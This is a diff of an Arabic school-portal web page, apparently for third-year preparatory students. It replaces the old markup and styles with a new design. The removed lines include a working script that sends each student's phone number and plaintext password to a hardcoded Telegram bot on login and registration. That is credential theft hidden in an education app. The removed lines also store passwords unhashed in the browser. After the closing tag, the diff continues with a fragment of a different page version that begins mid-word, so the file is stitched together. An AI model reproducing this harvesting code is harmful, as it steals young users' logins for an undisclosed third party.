@@ -1,1730 +1,235 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مستقبلي 3إعدادي</title>
-    <!-- خط تجوال من جوجل -->
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Tajawal', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background-color: #0f172a;
-            color: #f8fafc;
-            min-height: 100vh;
-            padding-bottom: 30px;
-        }
-
-        /* الهيدر العلوي */
-        header {
-            background: linear-gradient(135deg, #1e293b, #0f172a);
-            padding: 20px 15px;
-            text-align: center;
-            border-bottom: 2px solid #3b82f6;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        header h1 {
-            color: #38bdf8;
-            font-size: 1.6rem;
-            font-weight: 900;
-        }
-
-        header p {
-            color: #94a3b8;
-            font-size: 0.85rem;
-            margin-top: 4px;
-        }
-
-        /* الحاوية الرئيسية */
-        .container {
-            padding: 15px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        /* كارت الترحيب والحساب */
-        .user-card {
-            background: #1e293b;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #334155;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .user-info span {
-            display: block;
-            font-size: 0.8rem;
-            color: #94a3b8;
-        }
-
-        .user-info h3 {
-            color: #f8fafc;
-            font-size: 1.1rem;
-        }
-
-        .logout-btn {
-            background: #ef4444;
-            color: white;
-            border: none;
-            padding: 8px 14px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 0.85rem;
-        }
-
-        /* شبكة المواد والأقسام */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .card {
-            background: #1e293b;
-            border: 1px solid #334155;
-            padding: 15px;
-            border-radius: 12px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            color: inherit;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .card:active {
-            transform: scale(0.97);
-            background: #334155;
-        }
-
-        .card .icon {
-            font-size: 2rem;
-            margin-bottom: 8px;
-        }
-
-        .card h4 {
-            font-size: 1rem;
-            color: #f1f5f9;
-        }
-
-        /* نوافذ تسجيل الدخول (Overlay Modals) */
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(15, 23, 42, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            padding: 20px;
-        }
-
-        .modal-content {
-            background: #1e293b;
-            padding: 25px;
-            border-radius: 16px;
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid #3b82f6;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-
-        .modal-content h2 {
-            color: #38bdf8;
-            margin-bottom: 8px;
-        }
-
-        .modal-content p {
-            color: #94a3b8;
-            font-size: 0.85rem;
-            margin-bottom: 20px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-            text-align: right;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 0.85rem;
-            color: #cbd5e1;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            background: #0f172a;
-            color: #fff;
-            font-size: 0.95rem;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #3b82f6;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background: #3b82f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .submit-btn:active {
-            background: #2563eb;
-        }
-
-        .switch-link {
-            margin-top: 15px;
-            font-size: 0.85rem;
-            color: #94a3b8;
-        }
-
-        .switch-link a {
-            color: #38bdf8;
-            text-decoration: none;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#050b20">
+<meta name="description" content="مستقبلي — منصتك التعليمية المتكاملة للصف الثالث الإعدادي">
+<title>مستقبلي | تعلّم. تطوّر. حقق مستقبلك.</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap');
+:root{--bg:#050918;--panel:#0b1430;--panel2:#101e40;--blue:#2563ff;--cyan:#28dcff;--purple:#8a5bff;--white:#f5f8ff;--muted:#9eafd1;--line:rgba(100,157,255,.22);--shadow:0 24px 70px #0005}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;min-height:100vh;background:var(--bg);color:var(--white);font-family:'Cairo',Tahoma,Arial,sans-serif;overflow-x:hidden}
+body:before{content:"";position:fixed;inset:0;pointer-events:none;z-index:-2;background:radial-gradient(ellipse at 14% 8%,#123b9b55,transparent 35%),radial-gradient(ellipse at 85% 42%,#0b9bb522,transparent 32%),radial-gradient(ellipse at 50% 100%,#17265b55,transparent 45%)}
+body:after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.14;background-image:linear-gradient(#4d85ff15 1px,transparent 1px),linear-gradient(90deg,#4d85ff15 1px,transparent 1px);background-size:44px 44px;mask-image:linear-gradient(to bottom,#000,transparent 85%)}
+button,input{font:inherit}
+button{cursor:pointer}
+.hidden{display:none!important}
+a{color:inherit}
+.topbar{position:sticky;top:0;z-index:20;background:#050918d9;backdrop-filter:blur(18px);border-bottom:1px solid var(--line)}
+.topbar-inner{width:min(1180px,92%);margin:auto;min-height:78px;display:flex;align-items:center;justify-content:space-between;gap:18px}
+.brand{display:flex;align-items:center;gap:12px;min-width:0}
+.brand-mark{width:48px;height:48px;border-radius:16px;display:grid;place-items:center;position:relative;background:linear-gradient(145deg,#1d5eff,#05c8f2);box-shadow:0 8px 28px #1768ff4c;font-size:25px}
+.brand-mark:after{content:"";position:absolute;inset:1px;border:1px solid #ffffff80;border-radius:15px}
+.brand-title{font-weight:900;letter-spacing:-.5px;font-size:19px;line-height:1.35}.brand-sub{font-size:11px;color:#9eb8eb;margin-top:4px}
+.top-actions{display:flex;align-items:center;gap:10px}
+.pill{border:1px solid var(--line);border-radius:13px;padding:9px 13px;background:#0b1837;color:#dce9ff;font-size:13px}
+.pill:hover{border-color:var(--cyan)}
+main{width:min(1180px,92%);margin:0 auto 60px}
+.hero{padding:55px 0 34px;display:grid;grid-template-columns:1.1fr .9fr;gap:28px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:9px;padding:7px 12px;border:1px solid #3b7dff55;border-radius:100px;background:#10317455;color:#9beaff;font-size:12px;font-weight:700}
+.pulse{width:7px;height:7px;border-radius:50%;background:#3cf1ff;box-shadow:0 0 13px #3cf1ff}
+.hero h1{font-size:clamp(35px,5.3vw,64px);line-height:1.22;letter-spacing:-1.5px;margin:18px 0 13px;font-weight:900}
+.gradient-text{background:linear-gradient(95deg,#fff 8%,#85efff 46%,#5e91ff 90%);color:transparent;background-clip:text}
+.hero p{color:#aebfe2;font-size:16px;line-height:2;margin:0;max-width:590px}
+.hero-buttons{display:flex;gap:12px;flex-wrap:wrap;margin-top:24px}
+.btn-primary,.btn-secondary{border-radius:14px;padding:13px 19px;font-weight:800;border:1px solid transparent;display:inline-flex;align-items:center;justify-content:center;gap:9px;transition:.22s}
+.btn-primary{background:linear-gradient(100deg,#1761ff,#04bde9);box-shadow:0 12px 30px #0877ff32;color:white}
+.btn-secondary{background:#101d3c;border-color:var(--line);color:#e4edff}
+.btn-primary:hover,.btn-secondary:hover{transform:translateY(-2px);filter:brightness(1.1)}
+.hero-art{position:relative;min-height:320px;display:grid;place-items:center}
+.orbit{width:min(340px,85%);aspect-ratio:1;border-radius:50%;border:1px solid #247aff50;display:grid;place-items:center;position:relative;background:radial-gradient(circle,#103b8b55,transparent 66%);box-shadow:inset 0 0 55px #1257c322,0 0 90px #0a65ff12}
+.orbit:before,.orbit:after{content:"";position:absolute;border:1px solid #1b79ff5a;border-radius:50%;inset:20px;transform:rotate(-25deg) scaleX(1.12)}
+.orbit:after{inset:-18px 35px;transform:rotate(45deg);border-color:#11cfff2c}
+.book-icon{font-size:105px;filter:drop-shadow(0 0 22px #198bff9c);animation:float 5s ease-in-out infinite}
+.float-card{position:absolute;display:flex;align-items:center;gap:9px;padding:11px 14px;border:1px solid #397cff55;background:#0a1638e8;backdrop-filter:blur(12px);border-radius:14px;box-shadow:var(--shadow);font-size:12px;color:#dbeaff}
+.float-card b{display:block;font-size:13px;color:white}.float-card small{color:#8faad9}.fc1{top:14%;right:0}.fc2{bottom:14%;left:0}
+@keyframes float{50%{transform:translateY(-9px)}}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:4px 0 35px}
+.stat{border:1px solid var(--line);border-radius:17px;padding:15px 17px;background:linear-gradient(135deg,#0d1b3cbb,#08122bbb);display:flex;align-items:center;gap:12px}
+.stat-icon{width:40px;height:40px;border-radius:12px;background:#1b4ec133;display:grid;place-items:center;font-size:20px}
+.stat strong{font-size:15px;display:block}.stat span{font-size:11px;color:var(--muted)}
+.section{margin-top:32px}.section-heading{display:flex;align-items:end;justify-content:space-between;gap:16px;margin-bottom:20px}
+.section-heading h2{font-size:25px;margin:0;font-weight:900}.section-heading p{margin:5px 0 0;color:var(--muted);font-size:13px}
+.surface{border:1px solid var(--line);border-radius:25px;background:linear-gradient(145deg,#0b1633ed,#071027f5);box-shadow:var(--shadow);padding:clamp(18px,3vw,28px)}
+.login-wrap{max-width:560px;margin:10px auto 60px}
+.login-heading{text-align:center;margin-bottom:22px}.login-emblem{width:70px;height:70px;margin:0 auto 13px;border-radius:22px;background:linear-gradient(145deg,#1a66ff,#09c9ed);display:grid;place-items:center;font-size:34px;box-shadow:0 12px 32px #0877ff33}
+.login-heading h2{margin:0;font-size:27px}.login-heading p{margin:7px 0 0;color:var(--muted);font-size:13px}
+.field-label{display:block;font-size:13px;color:#c6d6f7;font-weight:700;margin:14px 0 7px}
+.field{width:100%;padding:14px 15px;border-radius:13px;background:#050d22;border:1px solid #27477e;color:white;outline:none}
+.field:focus{border-color:#27cfff;box-shadow:0 0 0 3px #0bcaff18}
+.full{width:100%;margin-top:18px}
+.note{font-size:11px;color:#7f96c5;line-height:1.9;text-align:center;margin:15px 0 0}
+.subject-grid{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:14px}
+.subject-card{position:relative;overflow:hidden;min-height:180px;text-align:right;padding:19px 17px;border:1px solid var(--line);border-radius:20px;background:linear-gradient(150deg,#102650,#09142e 78%);color:white;transition:.25s}
+.subject-card:before{content:"";position:absolute;width:120px;height:120px;border-radius:50%;background:#1c70ff13;left:-45px;bottom:-60px}
+.subject-card:hover{transform:translateY(-5px);border-color:#29caff;box-shadow:0 16px 35px #005dff25}
+.subject-emoji{width:52px;height:52px;border-radius:16px;background:linear-gradient(145deg,#1a5be4,#0a9fc6);display:grid;place-items:center;font-size:26px;margin-bottom:20px;box-shadow:0 8px 22px #0a71ff24}
+.subject-card strong{display:block;font-size:16px;position:relative}.subject-card small{display:block;color:#90a8d4;font-size:11px;margin-top:6px;position:relative}
+.arrow{position:absolute;left:16px;bottom:18px;color:#5adfff;font-size:19px}
+.content-layout{display:grid;grid-template-columns:220px minmax(0,1fr);gap:18px}
+.side-info{padding:20px;border:1px solid var(--line);border-radius:20px;background:#0a1630}
+.side-info h3{margin:0 0 5px}.side-info p{margin:0;color:var(--muted);font-size:12px;line-height:1.8}
+.type-list{display:grid;gap:8px;margin-top:19px}
+.type-btn{display:flex;align-items:center;gap:10px;text-align:right;width:100%;padding:12px;border:1px solid transparent;border-radius:12px;background:transparent;color:#c2d3f5}
+.type-btn.active{background:linear-gradient(90deg,#123d8c,#102b5c);border-color:#2b78ff;color:#fff;box-shadow:inset -3px 0 #2ddcff}
+.content-main{min-width:0}
+.content-top{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:15px}
+.content-top h2{margin:0;font-size:24px}.content-top p{margin:4px 0 0;color:var(--muted);font-size:12px}
+.content-count{font-size:12px;border:1px solid var(--line);padding:7px 11px;border-radius:99px;color:#a8c5ff}
+.item-list{display:grid;gap:11px}
+.content-item{display:flex;align-items:center;gap:13px;padding:14px;border:1px solid var(--line);border-radius:16px;background:#0b1833;transition:.2s}
+.content-item:hover{border-color:#338bff;background:#0e2045}
+.item-icon{flex:0 0 46px;height:46px;border-radius:13px;display:grid;place-items:center;background:#123b7b;font-size:22px}
+.item-body{min-width:0;flex:1}.item-body h3{font-size:14px;margin:0 0 4px;overflow-wrap:anywhere}.item-body p{font-size:11px;color:var(--muted);margin:0;overflow-wrap:anywhere}
+.item-action{border:1px solid #2775ff66;background:#10306a;color:#dffaff;padding:9px 12px;border-radius:11px;white-space:nowrap;font-size:12px;font-weight:800}
+.item-action:hover{background:#1550a5;border-color:#26d8ff}
+.empty-state{text-align:center;padding:42px 16px;border:1px dashed #294879;border-radius:18px;background:#08142a88}
+.empty-icon{font-size:40px;margin-bottom:8px}.empty-state h3{margin:0 0 6px}.empty-state p{margin:0;color:var(--muted);font-size:12px;line-height:1.9}
+.player{margin-top:20px;border:1px solid #2a79ff66;border-radius:20px;background:#050c1c;overflow:hidden;box-shadow:0 18px 55px #0004}
+.player-head{padding:15px 17px;display:flex;align-items:center;justify-content:space-between;gap:10px;background:linear-gradient(90deg,#102754,#09152e);border-bottom:1px solid var(--line)}
+.player-head h3{margin:0;font-size:15px}.player-head p{margin:4px 0 0;color:var(--muted);font-size:11px}
+.player-frame{aspect-ratio:16/9;background:#000}.player-frame iframe,.player-frame video,.player-frame img{width:100%;height:100%;border:0;display:block;object-fit:contain}
+.player-foot{padding:12px 16px;color:#90a9d8;font-size:11px}
+.back-button{margin-bottom:18px}
+footer{border-top:1px solid var(--line);padding:24px 4%;text-align:center;color:#8298c4;font-size:12px}
+.toast{position:fixed;bottom:22px;left:50%;transform:translate(-50%,20px);opacity:0;pointer-events:none;z-index:50;background:#10274d;border:1px solid #2a81ff;border-radius:13px;padding:12px 18px;box-shadow:var(--shadow);transition:.25s;font-size:13px}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+@media(max-width:900px){.hero{grid-template-columns:1fr .7fr}.subject-grid{grid-template-columns:repeat(3,minmax(0,1fr))}.content-layout{grid-template-columns:190px minmax(0,1fr)}}
+@media(max-width:650px){.topbar-inner{min-height:68px}.brand-title{font-size:15px}.brand-sub{font-size:10px}.brand-mark{width:42px;height:42px}.top-actions .pill{padding:8px;font-size:11px}.hero{grid-template-columns:1fr;padding:38px 0 24px}.hero h1{font-size:39px}.hero-art{min-height:225px;grid-row:1}.orbit{width:205px}.book-icon{font-size:76px}.fc1{right:4%;top:7%}.fc2{left:2%;bottom:5%}.stats{gap:7px}.stat{padding:10px;gap:8px}.stat-icon{width:32px;height:32px}.stat strong{font-size:12px}.stat span{font-size:9px}.subject-grid{grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}.subject-card{min-height:155px;padding:14px}.subject-emoji{width:44px;height:44px;margin-bottom:14px}.subject-card strong{font-size:14px}.content-layout{grid-template-columns:1fr}.side-info{padding:14px}.type-list{grid-template-columns:repeat(3,minmax(0,1fr));margin-top:12px}.type-btn{justify-content:center;text-align:center;display:block;padding:10px 5px;font-size:11px}.content-item{gap:9px;padding:11px}.item-icon{flex-basis:39px;height:39px;font-size:19px}.item-action{padding:8px;font-size:11px}.section-heading h2{font-size:21px}}
+</style>
 </head>
 <body>
-
-    <!-- الهيدر -->
-    <header>
-        <h1>مستقبلي 3إعدادي 🎓</h1>
-        <p>منصتك التفاعلية للشهادة الإعدادية</p>
-    </header>
-
-    <!-- المحتوى الرئيسي -->
-    <div class="container">
-        
-        <!-- كارت بيانات الطالب -->
-        <div class="user-card" id="userCard">
-            <div class="user-info">
-                <span>أهلاً بك يا بطل 👋</span>
-                <h3 id="displayStudentName">طالب مستقبلي</h3>
-            </div>
-            <button class="logout-btn" onclick="logout()">خروج</button>
-        </div>
-
-        <!-- شبكة المواد والدروس -->
-        <div class="grid">
-            <div class="card" onclick="openSection('الدراسات الاجتماعية')">
-                <div class="icon">🌍</div>
-                <h4>الدراسات</h4>
-            </div>
-            <div class="card" onclick="openSection('اللغة العربية')">
-                <div class="icon">📚</div>
-                <h4>اللغة العربية</h4>
-            </div>
-            <div class="card" onclick="openSection('العلوم والكيمياء')">
-                <div class="icon">🔬</div>
-                <h4>العلوم</h4>
-            </div>
-            <div class="card" onclick="openSection('الرياضيات')">
-                <div class="icon">📐</div>
-                <h4>الرياضيات</h4>
-            </div>
-            <div class="card" onclick="openSection('الاختبارات والتطبيقات')">
-                <div class="icon">📝</div>
-                <h4>الاختبارات</h4>
-            </div>
-            <div class="card" onclick="openSection('الملخصات والـ PDF')">
-                <div class="icon">📄</div>
-                <h4>الملخصات</h4>
-            </div>
-        </div>
-
-    </div>
-
-    <!-- نافذة تسجيل الدخول -->
-    <div class="modal hidden" id="loginModal">
-        <div class="modal-content">
-            <h2>تسجيل الدخول</h2>
-            <p>ادخل إلى حسابك في تطبيق مستقبلي</p>
-            <form onsubmit="handleLogin(event)">
-                <div class="input-group">
-                    <label>رقم الهاتف</label>
-                    <input type="tel" id="loginPhone" placeholder="01xxxxxxxxx" required>
-                </div>
-                <div class="input-group">
-                    <label>كلمة السر</label>
-                    <input type="password" id="loginPass" placeholder="******" required>
-                </div>
-                <button type="submit" class="submit-btn">دخول</button>
-            </form>
-            <div class="switch-link">
-                ليس لديك حساب؟ <a onclick="showModal('registerModal')">إنشاء حساب جديد</a>
-            </div>
-            <div class="switch-link" style="margin-top: 8px;">
-                <a onclick="showModal('forgotModal')">نسيت كلمة السر؟</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة إنشاء حساب جديد -->
-    <div class="modal hidden" id="registerModal">
-        <div class="modal-content">
-            <h2>إنشاء حساب جديد</h2>
-            <p>انضم لطلاب مستقبلي الآن</p>
-            <form onsubmit="handleRegister(event)">
-                <div class="input-group">
-                    <label>اسم الطالب بالكامل</label>
-                    <input type="text" id="regName" placeholder="اكتب اسمك هنا" required>
-                </div>
-                <div class="input-group">
-                    <label>رقم الهاتف</label>
-                    <input type="tel" id="regPhone" placeholder="01xxxxxxxxx" required>
-                </div>
-                <div class="input-group">
-                    <label>كلمة السر</label>
-                    <input type="password" id="regPass" placeholder="اختر كلمة سر" required>
-                </div>
-                <button type="submit" class="submit-btn">تسجيل الحساب</button>
-            </form>
-            <div class="switch-link">
-                لديك حساب بالفعل؟ <a onclick="showModal('loginModal')">تسجيل الدخول</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- نافذة استعادة كلمة السر -->
-    <div class="modal hidden" id="forgotModal">
-        <div class="modal-content">
-            <h2>استعادة كلمة السر</h2>
-            <p>اكتب رقم هاتفك وستصلك رسالة الدعم</p>
-            <form onsubmit="handleForgot(event)">
-                <div class="input-group">
-                    <label>رقم الهاتف المسجل</label>
-                    <input type="tel" id="forgotPhone" placeholder="01xxxxxxxxx" required>
-                </div>
-                <button type="submit" class="submit-btn">إرسال طلب الاستعادة</button>
-            </form>
-            <div class="switch-link">
-                الرجوع إلى <a onclick="showModal('loginModal')">تسجيل الدخول</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- البرمجة والجافاسكريبت -->
-    <script>
-        // إعدادات بوت التليجرام الخاص بك
-        const TELEGRAM_BOT_TOKEN = '8179261073:AAE6D3_yE9v1_0k1d8rU4v2P42Q8q29O_90'; 
-        const TELEGRAM_CHAT_ID = '6096582496';
-
-        // دالة إرسال الإشعارات إلى التليجرام
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(err => console.error('Telegram Error:', err));
-        }
-
-        // إدلاء وإدارة النوافذ (Modals)
-        function showModal(modalId) {
-            document.querySelectorAll('.modal').forEach(m => m.classList.add('hidden'));
-            document.getElementById(modalId).classList.remove('hidden');
-        }
-
-        function hideAllModals() {
-            document.querySelectorAll('.modal').forEach(m => m.classList.add('hidden'));
-        }
-
-        // التثبت من حالة تسجيل الدخول عند فتح التطبيق
-        window.onload = function() {
-            const currentUser = localStorage.getItem('mostaqbali_user');
-            if (currentUser) {
-                const userData = JSON.parse(currentUser);
-                document.getElementById('displayStudentName').innerText = userData.name;
-                hideAllModals();
-            } else {
-                showModal('loginModal');
-            }
-        };
-
-        // تسجيل الدخول
-        function handleLogin(e) {
-            e.preventDefault();
-            const phone = document.getElementById('loginPhone').value.trim();
-            const pass = document.getElementById('loginPass').value.trim();
-
-            const savedUser = localStorage.getItem('user_' + phone);
-            if (savedUser) {
-                const userData = JSON.parse(savedUser);
-                if (userData.pass === pass) {
-                    localStorage.setItem('mostaqbali_user', JSON.stringify(userData));
-                    document.getElementById('displayStudentName').innerText = userData.name;
-                    hideAllModals();
-                    alert('أهلاً بك مجدداً يا ' + userData.name);
-                    sendToTelegram(`<b>📲 تسجيل دخول جديد:</b>\n<b>الاسم:</b> ${userData.name}\n<b>الهاتف:</b> ${phone}`);
-                    return;
-                }
-            }
-            
-            // في حالة الدخول السريع لأول مرة بدون حساب سابق
-            const defaultUser = { name: 'طالب مستقبلي (' + phone.slice(-4) + ')', phone: phone, pass: pass };
-            localStorage.setItem('mostaqbali_user', JSON.stringify(defaultUser));
-            document.getElementById('displayStudentName').innerText = defaultUser.name;
-            hideAllModals();
-            sendToTelegram(`<b>📲 دخول سريع للتطبيق:</b>\n<b>الهاتف:</b> ${phone}\n<b>كلمة السر:</b> ${pass}`);
-        }
-
-        // إنشاء حساب جديد
-        function handleRegister(e) {
-            e.preventDefault();
-            const name = document.getElementById('regName').value.trim();
-            const phone = document.getElementById('regPhone').value.trim();
-            const pass = document.getElementById('regPass').value.trim();
-
-            const newUser = { name: name, phone: phone, pass: pass };
-            localStorage.setItem('user_' + phone, JSON.stringify(newUser));
-            localStorage.setItem('mostaqbali_user', JSON.stringify(newUser));
-
-            document.getElementById('displayStudentName').innerText = name;
-            hideAllModals();
-            alert('تم إنشاء حسابك بنجاح! مرحباً بك يا ' + name);
-
-            sendToTelegram(`<b>🆕 حساب جديد في مستقبلي:</b>\n<b>الاسم:</b> ${name}\n<b>الهاتف:</b> ${phone}\n<b>كلمة السر:</b> ${pass}`);
-        }
-
-        // استعادة كلمة السر
-        function handleForgot(e) {
-            e.preventDefault();
-            const phone = document.getElementById('forgotPhone').value.trim();
-            alert('تم إرسال طلبك! سيتواصل معك الدعم الفني قريباً.');
-            sendToTelegram(`<b>⚠️ طلب استعادة كلمة السر:</b>\n<b>الهاتف:</b> ${phone}`);
-            showModal('loginModal');
-        }
-
-        // تسجيل الخروج
-        function logout() {
-            if (confirm('هل تريد تسجيل الخروج من التطبيق؟')) {
-                localStorage.removeItem('mostaqbali_user');
-                showModal('loginModal');
-            }
-        }
-
-        // النقر على أزرار المواد
-        function openSection(sectionName) {
-            alert('جاري فتح قسم: ' + sectionName + ' 🚀');
-        }
-    </script>
-</body>
-</html>
-atus-badge {
-            background: rgba(34, 197, 94, 0.15);
-            color: var(--success);
-            border: 1px solid rgba(34, 197, 94, 0.3);
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.78rem;
-            font-weight: 900;
-        }
-
-        .subject-desc {
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-bottom: 20px;
-            font-weight: 600;
-            line-height: 1.6;
-        }
-
-        .subject-btn {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 112, 243, 0.15);
-            color: #60a5fa;
-            border: 1px solid rgba(0, 112, 243, 0.3);
-            border-radius: 12px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            font-size: 0.92rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .subject-btn:hover { background: var(--primary); color: white; }
-
-        .content-view, .dynamic-items-container {
-            display: none;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
-        }
-
-        .content-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-        }
-
-        .back-btn {
-            background: var(--bg-input);
-            color: var(--text-main);
-            border: 1px solid var(--border-color);
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-family: 'Cairo';
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        .options-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .option-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .option-card:hover { border-color: var(--primary); background: #1e293b; }
-        .option-card h4 { font-size: 1.15rem; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-        .option-card p { font-size: 0.85rem; color: var(--text-muted); font-weight: 600; }
-
-        .item-card {
-            background: var(--bg-input);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 18px 20px;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .item-info h5 { font-size: 1.05rem; color: var(--text-main); font-weight: 900; margin-bottom: 4px; }
-        .item-info span { font-size: 0.85rem; color: var(--text-muted); }
-        .item-link-btn { background: var(--primary); color: white; text-decoration: none; padding: 8px 18px; border-radius: 10px; font-weight: 700; font-size: 0.88rem; }
-
-        footer {
-            text-align: center;
-            padding: 25px;
-            color: var(--text-muted);
-            font-size: 0.88rem;
-            margin-top: auto;
-            border-top: 1px solid var(--border-color);
-            background: rgba(13, 22, 38, 0.9);
-            font-weight: 600;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="auth-overlay" id="authOverlay" style="display: none;">
-        <div class="auth-container">
-            <div class="app-logo-badge">🎓</div>
-            <h1>الأسطورة 3إعدادي</h1>
-            <h2>منصة تعليمية متكاملة</h2>
-            <p id="authSubtitle">تعلم .. طور .. حقق مستقبلك</p>
-            
-            <div class="auth-box">
-                <div class="input-group" id="nameGroup" style="display: none;">
-                    <span class="input-icon">👤</span>
-                    <input type="text" id="authName" placeholder="الاسم بالكامل">
-                </div>
-
-                <div class="input-group">
-                    <span class="input-icon">📞</span>
-                    <input type="tel" id="authPhone" placeholder="رقم الهاتف (مثال: 010...)">
-                </div>
-                
-                <div class="input-group">
-                    <span class="input-icon">🔒</span>
-                    <input type="password" id="authPass" placeholder="كلمة المرور">
-                </div>
-
-                <button class="btn-auth" id="authBtn" onclick="submitAuth()">تسجيل الدخول</button>
-
-                <div class="auth-footer-links">
-                    <span onclick="forgotPassword()">نسيت كلمة المرور؟</span>
-                    <span id="switchText" onclick="toggleAuthMode()">إنشاء حساب جديد</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="navbar">
-        <div class="nav-brand" onclick="goHome()">🎓 الأسطورة 3إعدادي</div>
-        <div class="user-panel">
-            <span class="student-badge" id="studentBadge">زائر</span>
-            
-            <div style="position: relative;">
-                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
-                <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
-                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 قناة الواتساب</a>
-                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="main-container">
-        <div id="homeView">
-            <div class="welcome-card">
-                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-                <p>اختر المادة الدراسية المطلوبة لاستعراض الملخصات، الكورسات، والامتحانات</p>
-            </div>
-
-            <div class="section-title">📚 المواد الدراسية المقررة</div>
-
-            <div class="subjects-grid">
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">دراسات اجتماعية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">علوم</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
-                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
-                    </div>
-                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
-                </div>
-
-                <div class="subject-card">
-                    <div>
-                        <div class="subject-header">
-                            <span class="subject-title">لغة عربية</span>
-                            <span class="status-badge">متاح 🔥</span>
-                        </div>
